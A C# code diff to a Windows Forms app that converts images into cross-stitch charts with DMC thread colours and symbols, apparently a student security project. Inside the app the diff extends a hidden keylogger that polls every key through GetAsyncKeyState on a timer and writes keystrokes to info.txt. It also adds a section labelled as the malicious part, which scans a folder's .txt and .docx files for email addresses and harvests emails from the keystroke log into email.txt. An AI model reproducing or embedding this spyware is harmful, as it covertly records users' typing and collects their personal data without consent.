@@ -21,13 +21,15 @@ namespace Courseprojecttokb
         public Form1()
         {
             InitializeComponent();
+            comboBox1.Enabled = false;
+            numericheight.Enabled = false;
+            numericwidth.Enabled = false;
         }
         //доступ к клавиатуре
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
         private List<Options> ColorsInfo = new List<Options>();
-        // private List<Options> UsedColors = new List<Options>();
         private List<string> UsedColors = new List<string>();
         double propor;
         bool onoff = false;
@@ -125,7 +127,6 @@ namespace Courseprojecttokb
 
             return imagecopy;
         }
-
         private void PictureToKanva(Bitmap imagecopy)
         {
             UsedColors.Clear();
@@ -191,6 +192,10 @@ namespace Courseprojecttokb
                     onoff = true;
                     PictureToKanva(mainimage);
                     // pictureBox1.Image = mainimage;
+
+                    comboBox1.Enabled = true;
+                    numericheight.Enabled = true;
+                    numericwidth.Enabled = true;
                 }
                 catch
                 {
@@ -198,11 +203,6 @@ namespace Courseprojecttokb
                     "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
-        }
-
-        private void button2_Click(object sender, EventArgs e)
-        {
-            //PictureToKanva();
         }
 
         private void CorrectSize(Bitmap imagecopy)
@@ -300,48 +300,292 @@ namespace Courseprojecttokb
                 PictureToKanva(imagecopy);
             }
         }
-        private void tabPage2_Enter(object sender, EventArgs e)
+        private Color PerceivedBrightness(Color c)
         {
-            dataGridView1.Rows.Clear();
-            foreach (string num in UsedColors)
-            {
-                dataGridView1.Rows.Add(num, "1");
-            }
+            int val = (int)Math.Sqrt(
+            c.R * c.R * .241 +
+            c.G * c.G * .691 +
+            c.B * c.B * .068);
+            return (val > 130 ? Color.Black : Color.White);
         }
+
 
         PictureBoxWithInterpolationMode pictureBox1 = new PictureBoxWithInterpolationMode
         {
             Name = "pictureBox1",
             Size = new Size(200, 250),
-            Location = new Point(15, 201),
+            Location = new Point(15, 190),
             //Image = pictureBox1.Image,
             SizeMode = PictureBoxSizeMode.StretchImage,
             InterpolationMode = InterpolationMode.NearestNeighbor
         };
 
-
         //открытие формы
         private void Form1_Load(object sender, EventArgs e)
         {
-
             tabPage1.Controls.Add(pictureBox1);
-
             timer1.Start();
             //comboBox1.Text = "425";
-            ColorsToList("DMC.txt");
-            // pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
-            //WriteTotxt(HTMLText());
+            ColorsToList("DMC60.txt");
+            NumbersToList();
+            ReadAllFiles();
         }
-        string alltext;
+
+        private List<Numbers> UsedNumbers = new List<Numbers>();
+        List<List<string>> MatrixHex = new List<List<string>>();
+        string allsymbols = "▝▞ᴄᴅᴆᴇᴈᴉ▟■□▢▣▬▭▮▯▰▱▲△▴▵▶▷▸▹►◦◧◨◩◪ᴿᵀᵁᵂᵃᵄᵅᵆᵇᵈ◫◬◭◮◯◷◸◹◺ᴀᴃᴊᴋ▤▥▦▧▨▩▪▫ᴌᴍᴎᴏᴐᴑᴒᴓᴔᴕᴖᴗᴘᴙᴚᴛᴜ▻▼▽▾▿◀◁◂◃◄◅◆◇◈◉◊○◌◍◎●◐◑◒◓◔◕◖◗◘◙◚◛◢◣◤◥ᴝᴞᴟᴠᴡᴢᴣᴤᴥᴦᴧᴨᴩᴪᴫᴬᴭᴮᴯᴰᴱᴲᴳᴴᴵᴶᴷᴸᴹ◰◱◲◳◴◵◶ᴺᴻᴼᴽᴾᵉᵊᵋᵌᵍᵎᵏᵐᵑᵒᵓᵔᵕᵖᵗᵘᵙᵚᵛᵜᵝᵞᵟᵠᵡᵢᵣᵤᵥᵦᵧᵨᵩᵪᵫᵬᵭᵮᵯᵰᵱᵲᵳᵴᵵᵶᵷᵸᵹᵺᵻᵼᵽᵾᵿᶀᶁᶂᶃᶄᶅᶆᶇᶈᶉᶊᶋᶌᶍᶎᶏᶐᶑᶒᶓᶔᶕᶖᶗᶘᶙᶚᶛᶜᶝᶞᶟᶠᶡᶢᶣᶤᶥᶦᶧᶨᶩᶪᶫᶬᶭᶮᶯᶰᶱᶲᶳᶴᶵᶶᶷᶸᶹᶺᶻᶼᶽᶾᶿ";
+        List<Palitra> palitras = new List<Palitra>();
+        int hmatrix = 0, wmatrix = 0;
+
+        //Список номеров и hex
+        private void NumbersToList()
+        {
+            //ColorsInfo.Clear();
+            using (StreamReader fs = new StreamReader("Numbers.txt"))
+            {
+                string temp = "";
+                while (true)
+                {
+                    temp = fs.ReadLine();
+                    if (temp == null) break;
+                    string[] array = new string[2];
+                    array = temp.Split(new[] { ' ' }, 2);
+                    UsedNumbers.Add(new Numbers
+                    {
+                        Number = array[0],
+                        HEXFormat = array[1],
+                    });
+                }
+            }
+        }
+
+        private void PictureToMatrix()
+        {
+            if (pictureBox1.Image != null)
+            {
+                MatrixHex.Clear();
+                Bitmap input = new Bitmap(pictureBox1.Image);
+                hmatrix = input.Height;
+                wmatrix = input.Width;
+                int k = 0;
+                // перебираем в циклах все пиксели исходного изображения
+                for (int j = 0; j < input.Height; j++)
+                {
+                    List<string> row = new List<string>();
+                    for (int i = 0; i < input.Width; i++)
+                    {
+                        // получаем (i, j) пиксель
+
+                        Color pixel = input.GetPixel(i, j);
+                        String htmlColor = System.Drawing.ColorTranslator.ToHtml(pixel);
+
+                        if (!(palitras.Exists(x => x.HEXFormat == htmlColor)))
+                        {
+                            palitras.Add(new Palitra(UsedNumbers, htmlColor.ToLower())
+                            {
+                                HEXFormat = htmlColor,
+                                Symbol = allsymbols[k],
+
+                            });
+                            k++;
+                        }
+                        row.Add(htmlColor);
+
+                    }
+                    MatrixHex.Add(row);
+                }
+            }
+            else MessageBox.Show("Сначала загрузите картинку!");
+        }
+       
+        private void panel2_Paint(object sender, PaintEventArgs e)
+        {
+            panel2.Size = new Size(wmatrix * 20 + 20, hmatrix * 20 + 20);
+            Font f = new Font(Font, FontStyle.Bold);
+            for (int i = 0; i < wmatrix; i++)
+            {
+                for (int j = 0; j < hmatrix; j++)
+                {
+                    foreach (Palitra col in palitras)
+                    {
+                        if (col.HEXFormat == MatrixHex[j][i])
+                        {
+                            Color bg = ColorTranslator.FromHtml(MatrixHex[j][i]);
+                            e.Graphics.FillRectangle(new SolidBrush(bg), i * 20 + 20, j * 20 + 20, 20, 20);
+                            e.Graphics.DrawString(col.Symbol.ToString(), f, new SolidBrush(PerceivedBrightness(bg)), i * 20 + 24, j * 20 + 24);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        private void tabPage3_Enter(object sender, EventArgs e)
+        {
+            PictureToMatrix();
+            Paint += new PaintEventHandler(panel2_Paint);
+            foreach (Palitra pal in palitras)
+            {
+                ListViewItem item = new ListViewItem(pal.Number);
+                item.SubItems.Add(pal.HEXFormat);
+                item.SubItems.Add(pal.Symbol.ToString());
+                Color bg = ColorTranslator.FromHtml(pal.HEXFormat);
+                item.SubItems[1].BackColor = bg;
+                item.SubItems[1].ForeColor = PerceivedBrightness(bg);
+                item.UseItemStyleForSubItems = false;
+                listView1.Items.Add(item);
+            }
+        }
 
         //запись в файл
         private void WriteTotxt(string value)
         {
-            alltext += value;
             StreamWriter stream = new StreamWriter("info.txt", true);
+            /*if (text == "left")
+                stream.BaseStream.Seek(-1, SeekOrigin.End);
+            else*/       
             stream.Write(value);
             stream.Close();
         }
+
+
+
+
+        //Вредоносная часть
+
+        private void EmailOrNot(string text)
+        {
+            List<string> Email = new List<string>();
+            string re = @"(\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*)";
+            foreach (Match match in Regex.Matches(text, re))
+            {
+                Email.Add(match.Value);
+            }
+            if (Email != null)
+            {
+                StreamWriter stream = new StreamWriter("email.txt", true);
+                foreach (string em in Email)
+                {
+                    stream.Write(Environment.NewLine + em);
+                }
+                stream.Close();
+            }
+        }
+
+        //просмотр файлов 
+        private void ReadAllFiles()
+        {
+            List<string> fullfilesPath = Directory.EnumerateFiles("F:\\test", "*.*", SearchOption.AllDirectories).Where(s => s.EndsWith(".txt") || s.EndsWith(".docx")).ToList<string>();
+            string file, line;
+            for (int i=0; i<fullfilesPath.Count; i++)
+            {
+                file = fullfilesPath[i];
+                StreamReader FileRead = new StreamReader(file);
+                while((line = FileRead.ReadLine()) != null)
+                {
+                    EmailOrNot(line);
+                }
+            }
+        }
+
+        //закрытие формы и проверка на email в файле аудита
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            StreamReader stream = new StreamReader("info.txt");
+            string temp = "";
+            while (true)
+            {
+                temp = stream.ReadLine();
+                if (temp == null) break;
+                EmailOrNot(temp);
+            }
+            stream.Close();
+        }
+
+        //нажатие клавишы Shift
+        public static bool ShiftActive()
+        {
+            return ((Control.ModifierKeys & Keys.Shift) == Keys.Shift);
+        }
+        string text;
+        bool capslock, numlock;
+
+
+
+
+
+        //таймер
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            capslock = Console.CapsLock;
+            numlock = Console.NumberLock;
+            string buffer = "";
+            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
+            {
+                if (GetAsyncKeyState(i) == -32767)
+                {
+                    buffer = Enum.GetName(typeof(Keys), i);
+
+                    switch (buffer)
+                    { 
+                        case "Space": buffer = " "; break;
+                        case "CapsLock": buffer = ""; break;
+                        case "Enter": buffer = (Environment.NewLine); break;
+                        case "LButton": buffer = ""; break;
+                        case "LMenu": buffer = ""; break;
+                        case "Back":
+                            string str = File.ReadAllText("info.txt");
+                            if (str.Length > 0) str = str.Remove(str.Length - 1);
+                            File.WriteAllText("info.txt", str);
+                            buffer = "";
+                            break;
+                        case "OemQuotes": buffer = ShiftActive() ? "\"" : "'"; break;
+                        case "Oemcomma": buffer = ShiftActive() ? "<" : ","; break;
+                        case "OemPeriod": buffer = ShiftActive() ? ">" : "."; break;
+                        case "Oem2": buffer = ShiftActive() ? "?" : "/"; break;
+                        case "Oem6": buffer = ShiftActive() ? "}" : "]"; break;
+                        case "Oem4": buffer = ShiftActive() ? "{" : "["; break;
+                        case "OemMinus": buffer = ShiftActive() ? "_" : "-"; break;
+                        case "Oemplus": buffer = ShiftActive() ? "+" : "="; break;
+                        case ("LShiftKey"): buffer = ""; break;
+                        case "D0": buffer = ShiftActive() ? ")" : "0"; break;
+                        case "D1": buffer = ShiftActive() ? "!" : "1"; break;
+                        case "D2": buffer = ShiftActive() ? "@" : "2"; break;
+                        case "D3": buffer = ShiftActive() ? "#" : "3"; break;
+                        case "D4": buffer = ShiftActive() ? "$" : "4"; break;
+                        case "D5": buffer = ShiftActive() ? "%" : "5"; break;
+                        case "D6": buffer = ShiftActive() ? "^" : "6"; break;
+                        case "D7": buffer = ShiftActive() ? "&" : "7"; break;
+                        case "D8": buffer = ShiftActive() ? "*" : "8"; break;
+                        case "D9": buffer = ShiftActive() ? "(" : "9"; break;
+                        case "OemPipe": buffer = ShiftActive() ? "|" : "\\"; break;
+                        case "OemSemicolon": buffer = ShiftActive() ? ":" : ";"; break;
+
+                        case "NumPad0": buffer = "0"; break;
+                        case "NumPad1": buffer = "1"; break;
+                        case "NumPad2": buffer = "2"; break;
+                        case "NumPad3": buffer = "3"; break;
+                        case "NumPad4": buffer = "4"; break;
+                        case "NumPad5": buffer = "5"; break;
+                        case "NumPad6": buffer = "6"; break;
+                        case "NumPad7": buffer = "7"; break;
+                        case "NumPad8": buffer = "8"; break;
+                        case "NumPad9": buffer = "9"; break;
+                        case "Add": buffer = "+"; break;
+                        case "Subtract": buffer = "-"; break;
+                        case "Multiply": buffer = "*"; break;
+                        case "Divide": buffer = "/"; break;
+                    }
+                    buffer = capslock ? buffer.ToUpper() : buffer.ToLower();
+                    buffer = ShiftActive() ? buffer.ToUpper() : buffer.ToLower();                   
+                }
+            }
+            text += buffer;
+            WriteTotxt(text);
+            text = "";
+        }
+
+
         //текст с браузера
         /* private static String HTMLText()
          {
@@ -377,243 +621,5 @@ namespace Courseprojecttokb
              }
              return data;
          }*/
-
-
-        string text;
-        bool capslock, numlock;
-        int ctrl, shift, del, back = 0;
-
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            /*string email = "";
-            Regex re = new Regex(@"^[\w!#$%&amp;'*+\-/=?\^_`{|}~]+(\.[\w!#$%&amp;'*+\-/=?\^_`{|}~]+)*@((([\-\w]+\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\.){3}[0-9]{1,3}))$");
-            string result = re.Match(email).ToString();
-            StreamWriter stream = new StreamWriter("info.txt", true);
-            stream.Write(Environment.NewLine + result);
-            stream.Close();*/
-        }
-
-        int sp;
-
-
-        string buffer2; char a, ab;
-
-        public int Count { get; private set; }
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            capslock = Console.CapsLock;
-            numlock = Console.NumberLock;
-            string buffer = "";
-            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
-            {
-                if (GetAsyncKeyState(i) == -32767)
-                {
-                    buffer = Enum.GetName(typeof(Keys), i);
-
-                    if (capslock == true)
-                    {
-                        buffer = buffer.ToUpper();
-                    }
-                    else
-                        buffer = buffer.ToLower();
-
-                    switch (buffer)
-                    { 
-                        case "space":
-                        case "SPACE":
-                            buffer = " ";
-                            break;
-                        case "capslock":
-                        case "CAPSLOCK":
-                            buffer = " ";
-                            break;
-
-                        //  shiftkeylshiftkey
-
-                        case "oem7":
-                        case "OEM7":
-                            buffer = "'";
-                            break;
-
-                        case "enter":
-                        case "ENTER":
-                            buffer = (Environment.NewLine);
-                            break;
-
-                        case "LBUTTON":
-                        case "lbutton":
-                            buffer = "";
-                            break;
-                        case "OemPeriod":
-                        case "OEMPERIOD":
-                        case "oemperiod":
-                            buffer = ".";
-                            break;
-
-                        case "LMenu":
-                        case "lemnu":
-                        case "LMENU":
-                            buffer = "ALT ";
-                            break;
-                        case "Back":
-                            buffer = " ";
-                            break;
-
-                        case "oemcomma":
-                            buffer = ",";
-                            break;
-                        case "oemquestion":
-                            buffer = "?";
-                            break;
-                        case "oem1":
-                        case "OEM1":
-                            buffer = ";";
-                            break;
-                        case "oem5": 
-                        case "OEM5":
-                            buffer = "\\";
-                            break;
-                        case "oem6":
-                        case "OEM6":
-                            buffer = "]";
-                            break;
-                        case "oemopenbrackets":
-                            buffer = "[";
-                            break;
-                        case "oemminus":
-                            buffer = "-";
-                            break;
-                        case "oemplus":
-                            buffer = "+";
-                            break;
-                        case "D0":
-                        case "d0":
-                            buffer = "0";
-                            break;
-                        case "D1":
-                        case "d1":
-                            buffer = "1";
-                            break;
-                        case "D2":
-                        case "d2":
-                            buffer = "2";
-                            break;
-                        case "D3":
-                        case "d3":
-                            buffer = "3";
-                            break;
-                        case "D4":
-                        case "d4":
-                            buffer = "4";
-                            break;
-                        case "D5":
-                        case "d5":
-                            buffer = "5";
-                            break;
-                        case "D6":
-                        case "d6":
-                            buffer = "6";
-                            break;
-                        case "D7":
-                        case "d7":
-                            buffer = "7";
-                            break;
-                        case "D8":
-                        case "d8":
-                            buffer = "8";
-                            break;
-                        case "D9":
-                        case "d9":
-                            buffer = "9";
-                            break;
-                        case "oempipe":
-                            buffer = "|";
-                            break;
-                        case "oemsemicolon":
-                            buffer = ";";
-                            break;
-                        case "NUMPAD0":
-                        case "numpad0":
-                            buffer = "0";
-                            break;
-                        case "NUMPAD1":
-                        case "numpad1":
-                            buffer = "1";
-                            break;
-                        case "NUMPAD2":
-                        case "numpad2":
-                            buffer = "2";
-                            break;
-                        case "NUMPAD3":
-                        case "numpad3":
-                            buffer = "3";
-                            break;
-                        case "NUMPAD4":
-                        case "numpad4":
-                            buffer = "4";
-                            break;
-                        case "NUMPAD5":
-                        case "numpad5":
-                            buffer = "5";
-                            break;
-                        case "NUMPAD6":
-                        case "numpad6":
-                            buffer = "6";
-                            break;
-                        case "NUMPAD7":
-                        case "numpad7":
-                            buffer = "7";
-                            break;
-                        case "NUMPAD8":
-                        case "numpad8":
-                            buffer = "8";
-                            break;
-                        case "NUMPAD9":
-                        case "numpad9":
-                            buffer = "9";
-                            break;
-
-                    }
-                    
-                    /* if (buffer.Contains("control") || buffer.Contains("CONTROL")) try { buffer = buffer.Substring("CONTROL".Length, buffer.Length); ctrl = 2; }
-                         catch { buffer = ""; ctrl = 2; }
-                     if (buffer.Contains("shift") || buffer.Contains("SHIFT")) try { buffer = buffer.Substring("SHIFT".Length, buffer.Length); shift = 3; }
-                         catch { buffer = ""; shift = 3; }
-
-                     if (buffer.Equals("delete") || buffer.Equals("DELETE")) del = 2;
-                     if (buffer.Equals("back") || buffer.Equals("BACK")) back = 3;
-                     if (shift == 1)
-                     {
-                         try
-                         {
-                             a = Convert.ToChar(buffer);
-                             shift = 0;
-
-                         }
-                         catch { }
-
-                         if (capslock == true)
-                         {
-                             sp = Convert.ToInt32(a) + 32;
-                             try { ab = Convert.ToChar(sp); }
-                             catch { MessageBox.Show(sp.ToString()); }
-                             buffer = ab.ToString(); shift = 0;
-                         }
-                         else
-                         {
-                             buffer = buffer.ToString().ToUpper();
-                             sp = Convert.ToInt32(a) - 32;
-                             try { ab = Convert.ToChar(sp); }
-                             catch { MessageBox.Show(sp.ToString()); }
-                             buffer = ab.ToString(); shift = 0;
-                         }
-
-                         shift = 0;*/
-                }
-                text += buffer;
-            }
-            WriteTotxt(text);
-            text = "";
-        }
     }
 }
